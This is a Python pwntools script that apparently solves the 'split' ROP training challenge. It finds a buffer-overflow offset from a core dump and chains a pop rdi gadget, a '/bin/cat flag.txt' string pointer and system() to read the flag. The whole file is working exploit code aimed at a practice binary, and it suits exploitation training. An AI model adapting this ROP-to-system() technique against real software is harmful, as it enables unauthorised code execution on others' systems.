#!/usr/bin/env python3
from pwn import *
elf = context.binary = ELF('split')

# system(edi = str at 0x601060)

cmdstr = next(elf.search(b'/bin/cat flag.txt'))
system = elf.symbols.system

'''
We need to call system(edi = system)

stack layout:

HIGH

addr   -> system()              >> profit
strptr -> /bin/cat flag.txt     >> to be stored in edi
gadget -> pop rdi; ret          >> move argument into register
gadget -> ret                   >> align stack

LOW
'''

context.log_level = 'debug'

# find rip offset
io = process(elf.path)
io.sendline(cyclic(128))
io.wait()
core = io.corefile
stack = core.rsp
offset = core.read(stack, 4)

# craft payload
payload = flat(
    { offset: 0x000000000040053e },     # ret (movaps stack alignment)
    0x00000000004007c3,                 # pop rdi; ret
    cmdstr,                             # /bin/cat flag.txt
    system                              # libc system()
)
open('payload.bin', 'wb').write(payload)

io = process(elf.path)
io.recvuntil(b'> ')
io.sendline(payload)
io.recvuntil(b'Thank you!\n')
print(io.recvline().decode('utf-8'))
